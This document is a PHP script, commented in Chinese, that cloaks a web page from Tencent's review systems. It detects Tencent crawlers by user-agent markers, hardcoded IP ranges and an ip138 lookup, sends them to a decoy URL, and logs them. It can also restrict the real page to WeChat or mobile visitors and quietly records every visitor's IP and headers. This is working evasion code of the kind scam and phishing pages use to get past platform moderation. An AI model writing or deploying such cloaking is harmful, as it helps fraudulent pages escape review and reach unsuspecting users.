<?php

//第一层 判断浏览器 
//U;腾讯PC端共同特征 
//600.1.4 腾讯iPhone共同特征 
//1000 腾讯Android共同特征
$headers = $_SERVER['HTTP_USER_AGENT'];
$site = get_config();
$limiturl = $site['limiturl'];
$limit = $site['limit'];
if (strpos($headers, 'U;') != false || strpos($headers,'600.1.4') != false || strpos($headers,'1000') != false ) {
    //采集信息
    $stream = fopen("tx.txt", "ab");
    flock($stream, LOCK_EX); 
    fwrite($stream,"时间:".date('Y-m-d h:i:s',time())."----用户ip:".get_proxy_ip()."----特征headers:".$headers."\r\n");
    flock($stream, LOCK_UN); 
    fclose($stream);
    header('Location:'.$limiturl); 
    exit;
}


//第二层根据系统判断限制
if($limit == '1'){
    if (iss_mobile() == false) {
        header('Location:'.$limiturl);
        exit;
    }
}elseif($limit == '2'){
    if(stripos($headers, 'MicroMessenger') === false){
        header('Location:'.$limiturl);
        exit;
    }
}elseif($limit == '3'){
    if(stripos($headers, 'MicroMessenger') === false || stripos($headers, 'Wechat') !== false){
        header('Location:'.$limiturl);
        exit;
    }
}

//第三层 判断IP是否是禁用内的IP段
$iptables='2033385472~2033451007|2026635264~2026700799|989265920~989331455|1709309952~1709375487|3418587136~3418619903';
$remoteiplong=bindec(decbin(ip2long(get_proxy_ip())));
foreach(explode('|',$iptables) as $iprows){
    $ipbanrange=explode('~',$iprows);
    if($remoteiplong>=$ipbanrange[0] && $remoteiplong<=$ipbanrange[1])
    {
        $stream = fopen("tx.txt", "ab");
        flock($stream, LOCK_EX); 
        fwrite($stream,"时间:".date('Y-m-d h:i:s',time())."----用户ip:".get_proxy_ip()."----特征headers:".$headers."\r\n");
        flock($stream, LOCK_UN); 
        fclose($stream); 
        header('Location:'.$limiturl);  
        exit;
    }
}

//第四层 判断IP是否是腾讯
$ip = get_ip_ip138(get_proxy_ip());
$strpos1 = strpos($ip['data1'], '腾讯');
$strpos2 = strpos($ip['data2'], 'tencent');
$strpos3 = strpos($ip['data3'], '腾讯');

if ($strpos1 != false || $strpos2 != false || $strpos3 != false) {
    $stream = fopen("tx.txt", "ab");
    flock($stream, LOCK_EX); 
    fwrite($stream,"时间:".date('Y-m-d h:i:s',time())."----用户ip:".get_proxy_ip()."----特征headers:".$headers."----腾讯\r\n");
    flock($stream, LOCK_UN); 
    fclose($stream); 
    header('Location:'.$limiturl);  
    exit;
}


//采集用户信息
$stream = fopen("user.txt", "ab");
flock($stream, LOCK_EX); 
fwrite($stream,"时间:".date('Y-m-d h:i:s',time())."----用户ip:".get_proxy_ip()."----特征headers:".$headers."\r\n");
flock($stream, LOCK_UN); 
fclose($stream); 

/*****************************************封装方法******************************************/

//curl抓取页面
function curl_get($url)
{
    $ch=curl_init($url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; U; Android 4.4.1; zh-cn; R815T Build/JOP40D) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/4.5 Mobile Safari/533.1');
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $content=curl_exec($ch);
    curl_close($ch);
    return($content);
}

//IP138接口
function get_ip_ip138($ip){
    $url = 'http://www.ip138.com/ips138.asp?ip='.$ip.'&action=2';
    $data = curl_get($url);
    $data=mb_convert_encoding($data, "UTF-8", "GB2312");
    preg_match('!本站数据：(.*?)</li>!i',$data,$location1);
    preg_match('!参考数据1：(.*?)</li>!i',$data,$location2);
    preg_match('!参考数据2：(.*?)</li>!i',$data,$location3);
    return array(
        'data1'=>$location1[1],
        'data2'=>$location2[1],
        'data3'=>$location3[1],
    );
}

//判断是否是手机
function iss_mobile()
{
    $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    $is_pc = (strpos($agent, 'windows nt')) ? true : false;
    $is_mac = (strpos($agent, 'mac os')) ? true : false;
    $is_iphone = (strpos($agent, 'iphone')) ? true : false;
    $is_android = (strpos($agent, 'android')) ? true : false;
    $is_ipad = (strpos($agent, 'ipad')) ? true : false;

    if($is_pc){
          return  false;
    }
     
    if($is_mac){
          return  true;
    }
     
    if($is_iphone){
          return  true;
    }
     
    if($is_android){
          return  true;
    }
     
    if($is_ipad){
          return  true;
    }
}

//获取用户IP
function get_proxy_ip()
{
    $arr_ip_header = array(
        'HTTP_CDN_SRC_IP',
        'HTTP_PROXY_CLIENT_IP',
        'HTTP_WL_PROXY_CLIENT_IP',
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'REMOTE_ADDR',
    );
    $client_ip = 'unknown';
    foreach ($arr_ip_header as $key)
    {
        if (!empty($_SERVER[$key]) && strtolower($_SERVER[$key]) != 'unknown')
        {
            $client_ip = $_SERVER[$key];
            break;
        }
    }
    return $client_ip;
}